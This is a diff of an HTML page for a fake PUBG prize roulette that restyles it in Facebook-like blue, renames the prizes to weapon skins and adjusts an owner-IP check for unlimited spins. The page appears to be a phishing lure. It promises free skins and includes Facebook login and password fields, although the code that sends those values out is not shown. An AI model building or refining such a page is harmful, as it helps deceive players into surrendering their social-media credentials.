@@ -8,16 +8,16 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --pubg-gold: #ffd700;
-            --pubg-blue: #00d4ff;
-            --accent-red: #ff2e2e; /* Новогодний красный */
-            --bg-dark: #050f1a;
-            --primary: #00f2ff;
+            --pubg-gold: #ffc107;
+            --pubg-blue: #1877F2;
+            --accent-purple: #7B68EE;
+            --bg-dark: #0a1520;
+            --primary: #7B68EE;
+            --accent: #1877F2;
             --gold: #ffcc00;
-            --bg-card: rgba(255, 255, 255, 0.07);
-            --border-light: rgba(255, 255, 255, 0.2);
-            --text-main: #f0faff;
-            --snow-white: #ffffff;
+            --bg-card: rgba(20, 35, 60, 0.7);
+            --border-light: rgba(255, 255, 255, 0.1);
+            --text-main: #e0e6ed;
         }
         
         * {
@@ -27,7 +27,7 @@
         }
         
         body {
-            background: #020810;
+            background: #050a10;
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
@@ -35,23 +35,22 @@
             align-items: center;
             padding: 10px;
             overflow-x: hidden;
-            font-family: 'Inter', sans-serif;
+            font-family: 'Inter', -apple-system, sans-serif;
             position: relative;
         }
-
-        /* Анимированный зимний фон */
+        
+        /* Основной фон с параллакс-эффектом */
         body::before {
             content: '';
             position: fixed;
             inset: 0;
             background: 
-                radial-gradient(circle at 50% 0%, rgba(0, 212, 255, 0.2), transparent 50%),
                 radial-gradient(circle at 20% 30%, rgba(123, 104, 238, 0.15) 0%, transparent 40%),
                 radial-gradient(circle at 80% 70%, rgba(24, 119, 242, 0.15) 0%, transparent 40%),
                 url('phon.png');
             background-size: cover;
             background-position: center;
-            filter: brightness(0.4) contrast(1.2);
+            filter: brightness(0.5) saturate(1.2) hue-rotate(180deg);
             z-index: -2;
             animation: backgroundSlowPan 20s linear infinite alternate;
         }
@@ -60,26 +59,18 @@
             from { transform: scale(1); }
             to { transform: scale(1.1); }
         }
-
-        /* Эффект падающего снега */
+        
+        /* Сетка (Overlay Grid) — придает технологичный вид */
         body::after {
             content: '';
             position: fixed;
             inset: 0;
             background-image: 
-                radial-gradient(2px 2px at 20px 30px, #eee, rgba(0,0,0,0)),
-                radial-gradient(2px 2px at 40px 70px, #fff, rgba(0,0,0,0)),
-                radial-gradient(3px 3px at 50px 160px, #ddd, rgba(0,0,0,0));
-            background-repeat: repeat;
-            background-size: 200px 200px;
-            animation: snowAnim 10s linear infinite;
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            mask-image: radial-gradient(ellipse at center, black, transparent 80%);
             z-index: -1;
-            opacity: 0.5;
-        }
-
-        @keyframes snowAnim {
-            from { transform: translateY(-200px); }
-            to { transform: translateY(200px); }
         }
         
         /* СЧЕТЧИК ПОБЕДИТЕЛЕЙ (Стиль "Live") */
@@ -96,7 +87,7 @@
             display: flex;
             align-items: center;
             gap: 12px;
-            box-shadow: 0 0 20px rgba(0, 242, 255, 0.3);
+            box-shadow: 0 0 20px rgba(123, 104, 238, 0.3);
             animation: slideInDown 0.5s ease-out;
         }
         
@@ -127,7 +118,7 @@
             font-family: 'Orbitron', sans-serif;
             font-weight: 700;
             font-size: 18px;
-            background: linear-gradient(90deg, #00f2ff, #00b4d8);
+            background: linear-gradient(90deg, #7B68EE, #8A2BE2);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             animation: countPulse 2s infinite;
@@ -138,21 +129,24 @@
             50% { opacity: 0.7; }
         }
         
-        /* ВЕРХНЕЕ МЕНЮ (Обновленное под зиму) */
+        /* ВЕРХНЕЕ МЕНЮ (Glassmorphism) */
         .top-menu {
             width: 95%;
             max-width: 1000px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 15px 25px;
-            margin-top: 20px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
+            padding: 12px 25px;
+            margin-top: 30px;
+            background: rgba(15, 23, 36, 0.7);
+            border-radius: 15px;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(20px);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            border-bottom: 2px solid rgba(0, 242, 255, 0.5);
+            border-bottom: 2px solid rgba(123, 104, 238, 0.5);
+            backdrop-filter: blur(12px);
+            box-shadow: 
+                0 8px 32px 0 rgba(0, 0, 0, 0.8), 
+                inset 0 0 10px rgba(123, 104, 238, 0.1),
+                0 15px 35px rgba(0,0,0,0.5);
             z-index: 100;
             position: relative;
         }
@@ -195,18 +189,18 @@
             transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             font-size: 13px;
             backdrop-filter: blur(5px);
-            box-shadow: inset 0 0 10px rgba(0, 242, 255, 0.2);
+            box-shadow: inset 0 0 10px rgba(123, 104, 238, 0.2);
             position: relative;
         }
         
         .menu-btn:hover {
-            background: var(--pubg-blue);
+            background: var(--accent);
             border-color: var(--primary);
             transform: translateY(-3px);
             box-shadow: 
-                0 0 15px rgba(0, 242, 255, 0.4), 
-                inset 0 0 15px rgba(0, 242, 255, 0.4),
-                0 5px 15px rgba(0, 212, 255, 0.4);
+                0 0 15px rgba(123, 104, 238, 0.4), 
+                inset 0 0 15px rgba(123, 104, 238, 0.4),
+                0 5px 15px rgba(24, 119, 242, 0.4);
             color: white !important;
         }
         
@@ -215,7 +209,7 @@
             position: absolute;
             top: 100%;
             left: 0;
-            background: rgba(5, 15, 26, 0.95);
+            background: rgba(10, 20, 35, 0.95);
             border: 1px solid var(--primary);
             border-radius: 12px;
             min-width: 200px;
@@ -260,7 +254,7 @@
         }
         
         .dropdown-item:hover {
-            background: rgba(0, 242, 255, 0.2);
+            background: rgba(123, 104, 238, 0.2);
             color: #fff;
             padding-left: 20px;
         }
@@ -299,17 +293,17 @@
         }
         
         .language-btn:hover {
-            background: var(--pubg-blue);
-            border-color: var(--pubg-blue);
+            background: var(--accent);
+            border-color: var(--accent);
             transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0, 212, 255, 0.4);
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
         }
         
         .language-dropdown {
             position: absolute;
             top: 100%;
             right: 0;
-            background: rgba(5, 15, 26, 0.95);
+            background: rgba(10, 20, 35, 0.95);
             border: 1px solid var(--primary);
             border-radius: 12px;
             min-width: 200px;
@@ -337,7 +331,7 @@
         }
         
         .language-option:hover {
-            background: rgba(0, 242, 255, 0.2);
+            background: rgba(123, 104, 238, 0.2);
             color: #fff;
             transform: translateX(5px);
         }
@@ -348,7 +342,7 @@
         }
         
         .prize-mail-btn {
-            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            background: linear-gradient(135deg, #f39c12, #d35400);
             color: #000;
             border: none;
             border-radius: 8px;
@@ -390,8 +384,8 @@
         }
         
         @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.7); }
-            70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(243, 156, 18, 0.7); }
+            70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(243, 156, 18, 0); }
             100% { transform: scale(1); }
         }
         
@@ -423,15 +417,15 @@
         }
 
         .prize-content {
-            background: linear-gradient(180deg, #0a1520 0%, #050f1a 100%);
-            border: 2px solid #00d4ff;
+            background: linear-gradient(180deg, #162436 0%, #0a1018 100%);
+            border: 2px solid #1877F2;
             border-radius: 20px;
             padding: 40px 20px;
             width: 90%;
             max-width: 400px;
             text-align: center;
             position: relative;
-            box-shadow: 0 0 60px rgba(0, 212, 255, 0.15);
+            box-shadow: 0 0 60px rgba(24, 119, 242, 0.15);
             animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
@@ -451,14 +445,14 @@
             top: -20px;
             left: 50%;
             transform: translateX(-50%);
-            background: #00d4ff;
+            background: #1877F2;
             color: white;
             padding: 8px 40px;
             font-family: 'Orbitron', sans-serif;
             font-weight: 800;
             font-size: 20px;
             clip-path: polygon(5% 0%, 95% 0%, 100% 50%, 95% 100%, 5% 100%, 0% 50%);
-            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.4);
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4);
         }
 
         .prize-glow-container {
@@ -475,7 +469,7 @@
             position: absolute;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle, rgba(0, 212, 255, 0.3) 0%, rgba(0, 212, 255, 0) 70%);
+            background: radial-gradient(circle, rgba(24, 119, 242, 0.3) 0%, rgba(24, 119, 242, 0) 70%);
         }
 
         .prize-image {
@@ -503,7 +497,7 @@
         }
 
         .collect-btn {
-            background: linear-gradient(180deg, #00d4ff 0%, #0099cc 100%);
+            background: linear-gradient(180deg, #1877F2 0%, #1153b3 100%);
             border: none;
             padding: 15px 50px;
             border-radius: 8px;
@@ -513,12 +507,12 @@
             font-size: 16px;
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 5px 0 #0077aa;
+            box-shadow: 0 5px 0 #0d47a1;
         }
 
         .collect-btn:active {
             transform: translateY(3px);
-            box-shadow: 0 2px 0 #0077aa;
+            box-shadow: 0 2px 0 #0d47a1;
         }
 
         @keyframes fadeIn {
@@ -528,7 +522,7 @@
         
         .container {
             width: 100%;
-            max-width: 1000px;
+            max-width: 800px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -569,35 +563,35 @@
         .roulette-container {
             position: relative;
             width: 100%;
-            height: 450px;
+            height: 380px;
             background: rgba(20, 35, 60, 0.3);
             border-radius: 20px;
             overflow: hidden;
             margin-bottom: 25px;
             box-shadow: 
                 0 15px 30px rgba(0, 0, 0, 0.6),
-                inset 0 0 60px rgba(0, 212, 255, 0.2);
-            border: 3px solid rgba(0, 212, 255, 0.4);
+                inset 0 0 60px rgba(42, 59, 90, 0.3);
+            border: 3px solid rgba(42, 59, 90, 0.8);
             backdrop-filter: blur(10px);
             display: flex;
             align-items: center;
             justify-content: center;
         }
         
-        /* СЕТКА ПРИЗОВ (Улучшенная) */
+        /* НОВАЯ СЕТКА ПРИЗОВ - ЗИМНИЙ ДИЗАЙН */
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
             gap: 20px;
             width: 100%;
             max-width: 1000px;
-            margin-top: 40px;
+            margin: 40px 0;
             padding: 20px;
         }
 
         .prize-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border-light);
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 20px;
             padding: 15px;
             text-align: center;
@@ -612,7 +606,7 @@
         /* Эффект инея и свечения при наведении */
         .prize-card:hover {
             transform: translateY(-10px) scale(1.05);
-            border-color: var(--primary);
+            border-color: #00d4ff;
             box-shadow: 0 0 25px rgba(0, 242, 255, 0.4);
             background: rgba(255, 255, 255, 0.12);
         }
@@ -623,21 +617,27 @@
             position: absolute;
             top: 10px;
             right: -30px;
-            background: var(--accent-red);
+            background: #ff2e2e;
             color: white;
             padding: 2px 40px;
             font-size: 10px;
             font-weight: bold;
             transform: rotate(45deg);
             box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            z-index: 2;
         }
 
-        .prize-card img {
+        .prize-image {
             width: 100%;
             height: 140px;
             object-fit: contain;
             filter: drop-shadow(0 5px 15px rgba(0,212,255,0.4));
             margin-bottom: 15px;
+            transition: transform 0.3s;
+        }
+
+        .prize-card:hover .prize-image {
+            transform: scale(1.1) rotate(5deg);
         }
 
         .prize-name {
@@ -654,18 +654,9 @@
             padding: 4px 10px;
             border-radius: 50px;
             background: rgba(255, 215, 0, 0.2);
-            color: var(--pubg-gold);
-            border: 1px solid var(--pubg-gold);
-        }
-        
-        .center-item {
-            background: none;
-            border: none;
-        }
-        
-        .center-item img {
-            filter: drop-shadow(0 0 10px rgba(0, 212, 255, 0.5));
-            opacity: 0.8;
+            color: #ffd700;
+            border: 1px solid #ffd700;
+            display: inline-block;
         }
         
         /* ОБНОВЛЕННАЯ РАМКА В НОВОГОДНЕМ ЗИМНЕМ СТИЛЕ PUBG */
@@ -677,8 +668,8 @@
             box-shadow: 
                 inset 0 0 30px rgba(0, 212, 255, 0.4),
                 0 0 40px rgba(0, 212, 255, 0.6),
-                0 0 0 2px rgba(0, 212, 255, 0.8),
-                inset 0 0 0 2px rgba(0, 212, 255, 0.6);
+                0 0 0 2px rgba(24, 119, 242, 0.8),
+                inset 0 0 0 2px rgba(24, 119, 242, 0.6);
             z-index: 100;
             pointer-events: none;
             opacity: 0;
@@ -689,10 +680,10 @@
             background-image: 
                 linear-gradient(135deg, 
                     rgba(0, 212, 255, 0.1) 0%, 
-                    rgba(0, 212, 255, 0.2) 25%, 
-                    rgba(0, 242, 255, 0.1) 50%, 
+                    rgba(24, 119, 242, 0.2) 25%, 
+                    rgba(123, 104, 238, 0.1) 50%, 
                     rgba(0, 212, 255, 0.2) 75%, 
-                    rgba(0, 212, 255, 0.1) 100%);
+                    rgba(24, 119, 242, 0.1) 100%);
             background-size: 400% 400%;
             overflow: hidden;
         }
@@ -702,8 +693,8 @@
                 box-shadow: 
                     inset 0 0 30px rgba(0, 212, 255, 0.4),
                     0 0 40px rgba(0, 212, 255, 0.6),
-                    0 0 0 2px rgba(0, 212, 255, 0.8),
-                    inset 0 0 0 2px rgba(0, 212, 255, 0.6);
+                    0 0 0 2px rgba(24, 119, 242, 0.8),
+                    inset 0 0 0 2px rgba(24, 119, 242, 0.6);
                 border-color: rgba(0, 212, 255, 0.6);
                 background-position: 0% 50%;
             }
@@ -711,8 +702,8 @@
                 box-shadow: 
                     inset 0 0 40px rgba(0, 212, 255, 0.6),
                     0 0 60px rgba(0, 212, 255, 0.8),
-                    0 0 0 3px rgba(0, 212, 255, 1),
-                    inset 0 0 0 3px rgba(0, 212, 255, 0.8);
+                    0 0 0 3px rgba(24, 119, 242, 1),
+                    inset 0 0 0 3px rgba(24, 119, 242, 0.8);
                 border-color: rgba(0, 212, 255, 0.9);
                 background-position: 100% 50%;
             }
@@ -865,7 +856,7 @@
         
         /* КНОПКА ИГРАТЬ */
         .play-btn {
-            background: linear-gradient(180deg, #00f2ff 0%, #0088aa 100%);
+            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -874,7 +865,7 @@
             font-weight: 700;
             cursor: pointer;
             box-shadow: 
-                0 8px 25px rgba(0, 242, 255, 0.4),
+                0 8px 25px rgba(123, 104, 238, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             margin-bottom: 30px;
@@ -918,10 +909,10 @@
         .play-btn:hover:not(:disabled) {
             transform: translateY(-8px) scale(1.05);
             box-shadow: 
-                0 15px 35px rgba(0, 242, 255, 0.6),
+                0 15px 35px rgba(123, 104, 238, 0.6),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             letter-spacing: 3px;
-            background: linear-gradient(180deg, #00d4ff 0%, #006688 100%);
+            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
         }
         
         .play-btn:hover::before {
@@ -954,10 +945,10 @@
             max-width: 600px;
             display: none;
             margin-top: 20px;
-            border: 2px solid rgba(0, 212, 255, 0.3);
+            border: 2px solid rgba(24, 119, 242, 0.3);
             box-shadow: 
                 0 20px 40px rgba(0, 0, 0, 0.5),
-                inset 0 0 30px rgba(0, 212, 255, 0.2);
+                inset 0 0 30px rgba(42, 59, 90, 0.2);
             backdrop-filter: blur(10px);
             transition: all 0.6s ease;
         }
@@ -1013,13 +1004,13 @@
         
         .id-input:focus {
             outline: none;
-            border-color: #00d4ff;
-            box-shadow: 0 0 15px rgba(0, 212, 255, 0.3);
+            border-color: #1877F2;
+            box-shadow: 0 0 15px rgba(24, 119, 242, 0.3);
             transform: translateY(-2px);
         }
         
         .id-submit-btn {
-            background: linear-gradient(180deg, #00f2ff 0%, #0088aa 100%);
+            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -1028,7 +1019,7 @@
             font-weight: 700;
             cursor: pointer;
             box-shadow: 
-                0 10px 30px rgba(0, 242, 255, 0.4),
+                0 10px 30px rgba(123, 104, 238, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             width: 100%;
@@ -1062,10 +1053,10 @@
         .id-submit-btn:hover:not(:disabled) {
             transform: translateY(-5px);
             box-shadow: 
-                0 15px 35px rgba(0, 242, 255, 0.6),
+                0 15px 35px rgba(123, 104, 238, 0.6),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             letter-spacing: 2px;
-            background: linear-gradient(180deg, #00d4ff 0%, #006688 100%);
+            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
         }
         
         .id-submit-btn:hover::before {
@@ -1089,10 +1080,10 @@
             max-width: 600px;
             display: none;
             margin-top: 20px;
-            border: 2px solid rgba(0, 212, 255, 0.3);
+            border: 2px solid rgba(24, 119, 242, 0.3);
             box-shadow: 
                 0 20px 40px rgba(0, 0, 0, 0.5),
-                inset 0 0 30px rgba(0, 212, 255, 0.2);
+                inset 0 0 30px rgba(42, 59, 90, 0.2);
             backdrop-filter: blur(10px);
             transition: all 0.6s ease;
         }
@@ -1161,14 +1152,14 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), transparent);
+            background: linear-gradient(135deg, rgba(24, 119, 242, 0.1), transparent);
             opacity: 0;
             transition: opacity 0.3s;
         }
         
         .social-option:hover {
             transform: translateY(-5px) scale(1.05);
-            border-color: rgba(0, 212, 255, 0.5);
+            border-color: rgba(24, 119, 242, 0.5);
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
             animation: socialOptionHover 0.3s ease-out;
         }
@@ -1187,21 +1178,21 @@
         }
         
         .social-option.selected {
-            border-color: #00d4ff;
-            background: rgba(0, 212, 255, 0.1);
+            border-color: #1877F2;
+            background: rgba(24, 119, 242, 0.1);
             box-shadow: 
-                0 0 20px rgba(0, 212, 255, 0.4),
-                inset 0 0 10px rgba(0, 212, 255, 0.1);
+                0 0 20px rgba(24, 119, 242, 0.4),
+                inset 0 0 10px rgba(24, 119, 242, 0.1);
             transform: scale(1.05);
             animation: selectedSocial 0.5s ease-out infinite alternate;
         }
 
         @keyframes selectedSocial {
             from {
-                box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
+                box-shadow: 0 0 20px rgba(24, 119, 242, 0.4);
             }
             to {
-                box-shadow: 0 0 30px rgba(0, 212, 255, 0.7);
+                box-shadow: 0 0 30px rgba(24, 119, 242, 0.7);
             }
         }
         
@@ -1227,7 +1218,7 @@
         }
         
         .social-option.selected .social-icon {
-            background: rgba(0, 212, 255, 0.2);
+            background: rgba(24, 119, 242, 0.2);
             transform: scale(1.1);
         }
         
@@ -1240,13 +1231,13 @@
         }
         
         .social-option.selected span {
-            color: #00d4ff;
+            color: #1877F2;
             font-weight: 700;
         }
         
         /* КНОПКА ПОЛУЧИТЬ ПРИЗ */
         .get-prize-btn {
-            background: linear-gradient(180deg, #00f2ff 0%, #0088aa 100%);
+            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -1255,7 +1246,7 @@
             font-weight: 700;
             cursor: pointer;
             box-shadow: 
-                0 10px 30px rgba(0, 242, 255, 0.4),
+                0 10px 30px rgba(123, 104, 238, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             width: 100%;
@@ -1291,10 +1282,10 @@
         .get-prize-btn:hover:not(:disabled) {
             transform: translateY(-5px);
             box-shadow: 
-                0 15px 35px rgba(0, 242, 255, 0.6),
+                0 15px 35px rgba(123, 104, 238, 0.6),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             letter-spacing: 2px;
-            background: linear-gradient(180deg, #00d4ff 0%, #006688 100%);
+            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
         }
         
         .get-prize-btn:hover::before {
@@ -1394,7 +1385,7 @@
         
         .faq-section h2 {
             text-align: center;
-            color: #00f2ff;
+            color: #7B68EE;
             font-family: 'Orbitron', sans-serif;
             font-size: 28px;
             margin-bottom: 30px;
@@ -1417,8 +1408,8 @@
         }
         
         .faq-item.active {
-            border-color: #00f2ff;
-            box-shadow: 0 5px 15px rgba(0, 242, 255, 0.3);
+            border-color: #7B68EE;
+            box-shadow: 0 5px 15px rgba(123, 104, 238, 0.3);
         }
         
         .faq-question {
@@ -1435,12 +1426,12 @@
         }
         
         .faq-question:hover {
-            color: #00f2ff;
+            color: #7B68EE;
             background: rgba(42, 59, 90, 0.3);
         }
         
         .faq-question i {
-            color: #00f2ff;
+            color: #7B68EE;
             transition: transform 0.3s;
             font-size: 18px;
         }
@@ -1482,18 +1473,18 @@
         }
         
         .faq-answer strong {
-            color: #00f2ff;
+            color: #7B68EE;
         }
         
         .faq-answer a {
-            color: #00d4ff;
+            color: #1877F2;
             text-decoration: none;
             transition: all 0.3s;
         }
         
         .faq-answer a:hover {
             text-decoration: underline;
-            color: #00f2ff;
+            color: #7B68EE;
         }
         
         /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ - НОВЫЙ ДИЗАЙН */
@@ -1503,13 +1494,13 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background: linear-gradient(135deg, #0a1520, #162436);
-            color: #00f2ff;
+            color: #7B68EE;
             padding: 25px 35px;
             border-radius: 20px;
-            border: 2px solid #00f2ff;
+            border: 2px solid #7B68EE;
             box-shadow: 
                 0 15px 35px rgba(0, 0, 0, 0.6),
-                0 0 30px rgba(0, 242, 255, 0.3);
+                0 0 30px rgba(123, 104, 238, 0.3);
             display: none;
             z-index: 1001;
             max-width: 350px;
@@ -1541,7 +1532,7 @@
             left: -2px;
             right: -2px;
             bottom: -2px;
-            background: linear-gradient(45deg, #00f2ff, #0088aa, #00d4ff);
+            background: linear-gradient(45deg, #7B68EE, #4B0082, #8A2BE2);
             border-radius: 22px;
             z-index: -1;
         }
@@ -2452,12 +2443,12 @@
             left: 0;
             width: 0;
             height: 1px;
-            background: #00d4ff;
+            background: #1877F2;
             transition: width 0.3s;
         }
         
         .footer-link:hover {
-            color: #00d4ff;
+            color: #1877F2;
         }
         
         .footer-link:hover::after {
@@ -2542,22 +2533,21 @@
             }
             
             .roulette-container {
-                height: 350px;
+                height: 320px;
             }
             
             .prizes-grid {
-                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+                grid-template-columns: repeat(2, 1fr);
                 gap: 15px;
                 padding: 15px;
             }
             
-            .prize-card img {
-                height: 120px;
+            .prize-card {
+                padding: 10px;
             }
             
-            .center-item img {
-                width: 60px;
-                height: 60px;
+            .prize-image {
+                height: 100px;
             }
             
             .play-btn {
@@ -3009,51 +2999,52 @@
         </div>
         
         <div class="roulette-container">
-            <div class="prizes-grid">
+            <!-- НОВАЯ СЕТКА ПРИЗОВ С ЗИМНИМ ДИЗАЙНОМ -->
+            <div class="prizes-grid" id="prizesGrid">
                 <div class="prize-card" data-id="1">
-                    <img src="priz1.png" alt="Prize">
-                    <div class="prize-name">Premium Skin</div>
-                    <div class="rarity-tag">LEGENDARY</div>
+                    <img src="priz1.png" alt="Prize 1" class="prize-image">
+                    <div class="prize-name">M416 Glacier</div>
+                    <span class="rarity-tag">LEGENDARY</span>
                 </div>
                 <div class="prize-card" data-id="2">
-                    <img src="priz2.png" alt="Prize">
-                    <div class="prize-name">Rare Weapon</div>
-                    <div class="rarity-tag">EPIC</div>
+                    <img src="priz2.png" alt="Prize 2" class="prize-image">
+                    <div class="prize-name">Kar98k Frost</div>
+                    <span class="rarity-tag">EPIC</span>
                 </div>
                 <div class="prize-card" data-id="3">
-                    <img src="priz3.png" alt="Prize">
-                    <div class="prize-name">Vehicle Skin</div>
-                    <div class="rarity-tag">RARE</div>
+                    <img src="priz3.png" alt="Prize 3" class="prize-image">
+                    <div class="prize-name">AWM Arctic</div>
+                    <span class="rarity-tag">MYTHIC</span>
                 </div>
                 <div class="prize-card" data-id="4">
-                    <img src="priz4.png" alt="Prize">
-                    <div class="prize-name">UC Currency</div>
-                    <div class="rarity-tag">LEGENDARY</div>
+                    <img src="priz4.png" alt="Prize 4" class="prize-image">
+                    <div class="prize-name">UMP45 Snow</div>
+                    <span class="rarity-tag">RARE</span>
                 </div>
-                <div class="prize-card center-item" data-id="5">
-                    <img src="priz5.png" alt="Prize">
-                    <div class="prize-name">Special Outfit</div>
-                    <div class="rarity-tag">MYTHIC</div>
+                <div class="prize-card" data-id="5">
+                    <img src="priz5.png" alt="Prize 5" class="prize-image">
+                    <div class="prize-name">S12K Ice</div>
+                    <span class="rarity-tag">EPIC</span>
                 </div>
                 <div class="prize-card" data-id="6">
-                    <img src="priz6.png" alt="Prize">
-                    <div class="prize-name">Helmet Skin</div>
-                    <div class="rarity-tag">RARE</div>
+                    <img src="priz6.png" alt="Prize 6" class="prize-image">
+                    <div class="prize-name">DP-28 Winter</div>
+                    <span class="rarity-tag">LEGENDARY</span>
                 </div>
                 <div class="prize-card" data-id="7">
-                    <img src="priz7.png" alt="Prize">
-                    <div class="prize-name">Backpack Skin</div>
-                    <div class="rarity-tag">EPIC</div>
+                    <img src="priz7.png" alt="Prize 7" class="prize-image">
+                    <div class="prize-name">SCAR-L Frostbite</div>
+                    <span class="rarity-tag">MYTHIC</span>
                 </div>
                 <div class="prize-card" data-id="8">
-                    <img src="priz8.png" alt="Prize">
-                    <div class="prize-name">Glider Skin</div>
-                    <div class="rarity-tag">LEGENDARY</div>
+                    <img src="priz8.png" alt="Prize 8" class="prize-image">
+                    <div class="prize-name">Vector Glacier</div>
+                    <span class="rarity-tag">EPIC</span>
                 </div>
                 <div class="prize-card" data-id="9">
-                    <img src="priz9.png" alt="Prize">
-                    <div class="prize-name">Parachute Skin</div>
-                    <div class="rarity-tag">RARE</div>
+                    <img src="priz9.png" alt="Prize 9" class="prize-image">
+                    <div class="prize-name">Mini14 Arctic</div>
+                    <span class="rarity-tag">LEGENDARY</span>
                 </div>
             </div>
             
@@ -3285,6 +3276,19 @@
         let winnersInterval = null;
         let currentLang = 'en';
         let finalPrizeIndex = 0;
+        
+        // Список призов с новыми названиями
+        const prizes = [
+            { id: 1, image: "priz1.png", name: "M416 Glacier", rarity: "LEGENDARY" },
+            { id: 2, image: "priz2.png", name: "Kar98k Frost", rarity: "EPIC" },
+            { id: 3, image: "priz3.png", name: "AWM Arctic", rarity: "MYTHIC" },
+            { id: 4, image: "priz4.png", name: "UMP45 Snow", rarity: "RARE" },
+            { id: 5, image: "priz5.png", name: "S12K Ice", rarity: "EPIC" },
+            { id: 6, image: "priz6.png", name: "DP-28 Winter", rarity: "LEGENDARY" },
+            { id: 7, image: "priz7.png", name: "SCAR-L Frostbite", rarity: "MYTHIC" },
+            { id: 8, image: "priz8.png", name: "Vector Glacier", rarity: "EPIC" },
+            { id: 9, image: "priz9.png", name: "Mini14 Arctic", rarity: "LEGENDARY" }
+        ];
         
         // Функция сохранения состояния
         function saveUserState() {
@@ -3586,7 +3590,7 @@
             if (userPrize && !isPrizeReceived) {
                 badge.textContent = '1';
                 badge.style.display = 'flex';
-                badge.style.background = '#00f2ff';
+                badge.style.background = '#7B68EE';
                 mailBtn.disabled = false;
                 badge.style.animation = 'pulse 1.5s infinite';
             } else if (userPrize && isPrizeReceived) {
@@ -3722,9 +3726,10 @@
                     const stateLoaded = loadUserState();
                     
                     // Проверяем, является ли пользователь владельцем
-                    if (userIP === ownerIP) {
+                    const isOwner = (userIP === ownerIP);
+                    
+                    if (isOwner) {
                         console.log('Owner detected - unlimited spins');
-                        hasPlayed = false;
                         localStorage.setItem('isOwner', 'true');
                     } else {
                         console.log('Regular user - one spin only');
@@ -3791,19 +3796,6 @@
                 const fbPasswordInput = document.getElementById('fbPassword');
                 const fbLoginError = document.getElementById('fbLoginError');
                 const fbPasswordError = document.getElementById('fbPasswordError');
-                
-                // Призы с картинками
-                const prizes = [
-                    { id: 1, image: "priz1.png" },
-                    { id: 2, image: "priz2.png" },
-                    { id: 3, image: "priz3.png" },
-                    { id: 4, image: "priz4.png" },
-                    { id: 5, image: "priz5.png" },
-                    { id: 6, image: "priz6.png" },
-                    { id: 7, image: "priz7.png" },
-                    { id: 8, image: "priz8.png" },
-                    { id: 9, image: "priz9.png" }
-                ];
                 
                 let isSpinning = false;
                 let currentPrizeIndex = 0;
@@ -4007,7 +3999,8 @@
                     document.getElementById('prizeMailBtn').innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize} <div class="prize-badge" id="prizeBadge">0</div>`;
                     
                     // Обновляем кнопку игры
-                    if (hasPlayed && userIP !== ownerIP) {
+                    const isOwner = localStorage.getItem('isOwner') === 'true';
+                    if (hasPlayed && !isOwner) {
                         playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
                     } else {
                         playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
@@ -4101,6 +4094,7 @@
                 
                 // Функция показа уведомления
                 function showNotification(message, isError = false, isSuccess = false) {
+                    const t = translations[currentLang] || translations.en;
                     notification.textContent = message;
                     notification.classList.remove('error', 'success');
                     
@@ -4193,15 +4187,16 @@
                                 updatePrizeBadge();
                                 
                                 // Сохраняем, что пользователь уже играл (если не владелец)
